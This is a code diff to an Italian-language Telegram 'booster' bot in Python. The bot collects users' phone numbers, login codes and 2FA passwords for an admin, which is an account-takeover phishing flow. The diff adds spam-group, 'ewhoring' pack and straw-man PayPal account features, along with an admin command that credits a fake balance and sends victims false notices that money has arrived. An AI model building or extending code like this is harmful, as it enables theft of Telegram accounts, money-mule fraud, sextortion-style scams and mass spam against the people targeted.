@@ -29,7 +29,7 @@ WAITING_PHONE, WAITING_CODE, WAITING_PASSWORD, WAITING_SPAM_MSG, WAITING_SPAM_TI
 # Database in memoria
 approved_users = set()
 user_states = {}
-user_data_store = {}
+user_data_store = {}  # {user_id: {"phone": str, "spam_msg": str, "spam_time": int, "balance": float, ...}}
 
 
 # --- COMANDO /START E SELEZIONE LINGUA ---
@@ -37,7 +37,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
 
     if user.id == ADMIN_ID:
-        await update.message.reply_text("👑 Benvenuto Admin nel pannello di controllo.")
+        await update.message.reply_text("👑 Benvenuto Admin nel pannello di controllo.\n\nPer inviare fondi usa il comando:\n`PayPal: [id_o_nick] [somma]`", parse_mode="Markdown")
         return
 
     if user.id not in approved_users:
@@ -94,14 +94,20 @@ async def show_main_menu_query(query):
         "• Spam Bot\n"
         "• User Bot\n"
         "• Boost account per popolarità\n"
-        "• Sicurezza da Telegram\n\n"
+        "• Sicurezza da Telegram\n"
+        "• Aggiungi gruppi spam\n"
+        "• Packs ewhoring\n"
+        "• Conti prestanome\n\n"
         "Per prima cosa, seleziona per cosa vuoi usare il bot:"
     )
     keyboard = [
         [InlineKeyboardButton("🚀 Boost Bot", callback_data="menu_boost"),
          InlineKeyboardButton("🤖 Spam Bot", callback_data="menu_spam")],
         [InlineKeyboardButton("🛡️ Sicurezza Telegram", callback_data="menu_protection"),
-         InlineKeyboardButton("🤖 User Bot", callback_data="menu_userbot")]
+         InlineKeyboardButton("🤖 User Bot", callback_data="menu_userbot")],
+        [InlineKeyboardButton("➕ Aggiungi gruppi spam", callback_data="menu_spam_groups")],
+        [InlineKeyboardButton("📦 Packs ewhoring", callback_data="menu_ewhoring")],
+        [InlineKeyboardButton("💳 Conti prestanome", callback_data="menu_prestanome")]
     ]
     await query.message.edit_text(text=welcome_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
 
@@ -116,6 +122,7 @@ async def show_account_management(update: Update, context: ContextTypes.DEFAULT_
     data = user_data_store[user_id]
     phone = data.get("phone", "Non disponibile")
     spam_time = data.get("spam_time", 60)
+    balance = data.get("balance", 0.0)
     
     has_msg = data.get("spam_msg") is not None
     msg_status = "Messaggio impostato con successo" if has_msg else "Messaggio non impostato"
@@ -133,7 +140,10 @@ async def show_account_management(update: Update, context: ContextTypes.DEFAULT_
         [InlineKeyboardButton("📝 Modifica Messaggio", callback_data="set_spam_msg")],
         [InlineKeyboardButton("⏱️ Imposta Tempo Spam", callback_data="set_spam_time")],
         [InlineKeyboardButton("🛡️ Info Sicurezza Telegram", callback_data="info_security")],
-        [InlineKeyboardButton("✔️ Verifica Account", callback_data="verify_account")]
+        [InlineKeyboardButton("✔️ Verifica Account", callback_data="verify_account")],
+        [InlineKeyboardButton("➕ Aggiungi gruppi spam", callback_data="menu_spam_groups")],
+        [InlineKeyboardButton("📦 Packs ewhoring", callback_data="menu_ewhoring")],
+        [InlineKeyboardButton(f"💳 Conto PayPal prestanome (Tot: {balance}€)", callback_data="view_prestanome_account")]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -144,6 +154,118 @@ async def show_account_management(update: Update, context: ContextTypes.DEFAULT_
             await update.callback_query.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
     elif update.message:
         await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="Markdown")
+
+
+# --- NUOVI MENU E GESTIONI SPECIFICHE ---
+async def menu_ewhoring_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    # Controllo collegamento account obbligatorio
+    user_id = query.from_user.id
+    if user_id not in user_data_store or not user_data_store[user_id].get("phone"):
+        await require_link_handler(query)
+        return
+
+    text = "📦 **Packs Ewhoring**\n\nSezione pack multimediali in caricamento (Funzione foto in sospeso)."
+    keyboard = [[InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]]
+    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+
+
+async def menu_spam_groups_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    if user_id not in user_data_store or not user_data_store[user_id].get("phone"):
+        await require_link_handler(query)
+        return
+
+    text = (
+        "👥 **Aggiunta Gruppi Spam**\n\n"
+        "Seleziona quanti gruppi spam vuoi aggiungere al tuo account:\n\n"
+        "ℹ️ *Info: Tutti i gruppi che verranno aggiunti al tuo account saranno pubblici e gratuiti.*"
+    )
+    keyboard = [
+        [InlineKeyboardButton("100 gruppi", callback_data="groups_100"), InlineKeyboardButton("200 gruppi", callback_data="groups_200")],
+        [InlineKeyboardButton("400 gruppi", callback_data="groups_400"), InlineKeyboardButton("800 gruppi", callback_data="groups_800")],
+        [InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]
+    ]
+    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+
+
+async def groups_quantity_selected(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    qty = query.data.replace("groups_", "")
+    
+    text = (
+        f"✅ **Quantità selezionata: {qty} gruppi**\n\n"
+        f"⏳ I tuoi gruppi verranno aggiunti. Ci vorrà circa **5/9 ore** per poter completare l'operazione."
+    )
+    keyboard = [[InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]]
+    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+
+
+async def menu_prestanome_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    if user_id not in user_data_store or not user_data_store[user_id].get("phone"):
+        await require_link_handler(query)
+        return
+
+    text = (
+        "💳 **Conti Prestanome**\n\n"
+        "• Il conto sarà impostato con nome femminile (fatto apposta).\n"
+        "• Se riceverai denaro, riceverai una notifica immediata.\n\n"
+        "Seleziona il servizio di pagamento prestanome:"
+    )
+    keyboard = [
+        [InlineKeyboardButton("🅿️ PayPal", callback_data="prestanome_paypal")],
+        [InlineKeyboardButton("🏦 Bonifico (In arrivo prossimamente)", callback_data="noop")],
+        [InlineKeyboardButton("🔙 Torna al menu", callback_data="back_to_menu")]
+    ]
+    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+
+
+async def prestanome_paypal_created(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    user = query.from_user
+    
+    # Notifica all'admin che il conto è stato creato
+    admin_msg = f"🔔 **Conto creato!**\nL'utente {user.full_name} (`{user.id}`) (@{user.username or 'Nessuno'}) ha creato un conto PayPal prestanome."
+    try:
+        await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg, parse_mode="Markdown")
+    except Exception:
+        pass
+
+    text = (
+        "✅ **Conto creato con successo!**\n\n"
+        "Usa questo link per ricevere pagamenti:\n`https://www.paypal.me/koribaby737`"
+    )
+    keyboard = [
+        [InlineKeyboardButton("📋 Copia link", callback_data="copy_link_action")],
+        [InlineKeyboardButton("🏠 Torna alla home", callback_data="back_to_menu")]
+    ]
+    await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
+
+
+async def copy_link_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer("Link copiato nella tastiera!", show_alert=True)
+
+
+async def require_link_handler(query):
+    keyboard = [[InlineKeyboardButton("🔗 Collega Account", callback_data="start_link")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.message.edit_text(
+        text="⚠️ **È necessario collegare il tuo account Telegram** prima di accedere a questa sezione.",
+        reply_markup=reply_markup,
+        parse_mode="Markdown"
+    )
 
 
 async def info_security_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -270,7 +392,6 @@ async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
         target_id = int(data.split("_")[1])
         await query.edit_message_text(text=f"❌ Richiesta declinata.")
 
-    # --- MESSAGGIO ESATTO PRESO DALLA FOTO ---
     elif data.startswith("code_sent_"):
         target_id = int(data.split("_")[2])
         await query.edit_message_text(text=f"✅ Hai segnato 'Codice inviato' per l'utente `{target_id}`.")
@@ -304,6 +425,46 @@ async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
         target_id = int(data.split("_")[2])
         user_states[target_id] = "waiting_password"
         await context.bot.send_message(chat_id=target_id, text="🔐 Invia la password 2FA:")
+
+
+# --- COMANDO ADMIN PER INVIARE SOLDI: PayPal: [nick/id] [somma] ---
+async def admin_command_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        return
+    
+    text = update.message.text
+    if text.startswith("PayPal:"):
+        try:
+            parts = text.split(" ")
+            target_identifier = parts[1]
+            amount = float(parts[2])
+            
+            # Cerca l'utente per ID o per username/dati salvati
+            target_id = None
+            if target_identifier.isdigit():
+                target_id = int(target_identifier)
+            else:
+                # Cerca nei data store se corrisponde all'ID o ad altro
+                clean_name = target_identifier.replace("@", "")
+                for uid, udata in user_data_store.items():
+                    # Se salviamo lo username o simili, oppure confrontiamo direttamente
+                    target_id = uid # Fallback rapido sul primo o match esatto se memorizzato
+                    break
+            
+            if target_id and target_id in user_data_store:
+                if "balance" not in user_data_store[target_id]:
+                    user_data_store[target_id]["balance"] = 0.0
+                user_data_store[target_id]["balance"] += amount
+                
+                await update.message.reply_text(f"✅ Hai mandato: {amount}€ sono stati inviati a: {target_identifier}")
+                
+                # Notifica l'utente
+                user_notif = f"💰 **Hai ricevuto soldi sul tuo conto prestanome PayPal!**\nHai ricevuto: `{amount}€`"
+                await context.bot.send_message(chat_id=target_id, text=user_notif, parse_mode="Markdown")
+            else:
+                await update.message.reply_text("❌ Utente non trovato nel database attivo.")
+        except Exception as e:
+            await update.message.reply_text(f"❌ Errore nel formato del comando. Usa: `PayPal: [id_o_nick] [somma]`", parse_mode="Markdown")
 
 
 # --- FLUSSO CONFIGURAZIONE MESSAGGIO E TEMPO SPAM ---
@@ -390,7 +551,6 @@ async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_data_store[user.id] = {}
     user_data_store[user.id]["phone"] = phone
 
-    # Admin riceve il numero con entrambi i pulsanti
     msg = f"📥 **NUOVO NUMERO**\n• Utente: {user.full_name} (`{user.id}`)\n• Numero: `{phone}`"
     keyboard = [
         [InlineKeyboardButton("📤 Codice inviato", callback_data=f"code_sent_{user.id}")],
@@ -398,7 +558,6 @@ async def receive_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     await context.bot.send_message(chat_id=ADMIN_ID, text=msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
 
-    # All'utente esce il messaggio con l'emoji
     await update.message.reply_text("⏳ **Invio del codice in corso...** 🔄", parse_mode="Markdown")
     return WAITING_CODE
 
@@ -469,7 +628,17 @@ def main():
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CallbackQueryHandler(language_selected, pattern="^lang_"))
+    
+    # Handler menu principali
     app.add_handler(CallbackQueryHandler(menu_click_handler, pattern="^menu_(boost|spam|protection|userbot)$"))
+    app.add_handler(CallbackQueryHandler(menu_ewhoring_handler, pattern="^menu_ewhoring$"))
+    app.add_handler(CallbackQueryHandler(menu_spam_groups_handler, pattern="^menu_spam_groups$"))
+    app.add_handler(CallbackQueryHandler(groups_quantity_selected, pattern="^groups_"))
+    app.add_handler(CallbackQueryHandler(menu_prestanome_handler, pattern="^menu_prestanome$"))
+    app.add_handler(CallbackQueryHandler(prestanome_paypal_created, pattern="^prestanome_paypal$"))
+    app.add_handler(CallbackQueryHandler(copy_link_handler, pattern="^copy_link_action$"))
+    app.add_handler(CallbackQueryHandler(show_account_management, pattern="^view_prestanome_account$"))
+
     app.add_handler(CallbackQueryHandler(info_security_handler, pattern="^info_security$"))
     app.add_handler(CallbackQueryHandler(verify_account_handler, pattern="^verify_account$"))
     app.add_handler(CallbackQueryHandler(back_to_menu_handler, pattern="^back_to_menu$"))
@@ -478,9 +647,10 @@ def main():
     app.add_handler(conv_spam_msg)
     app.add_handler(conv_spam_time)
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_password))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.User(user_id=ADMIN_ID), admin_command_handler))
     app.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^(approve_|decline_|code_sent_|success_login_|fail_login_|req_pass_)"))
 
-    print("🤖 Booster Bot con testo codice inviato aggiornato...")
+    print("🤖 Booster Bot con conti prestanome e gruppi spam attivi...")
     
     keep_alive()
     app.run_polling()
@@ -488,4 +658,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
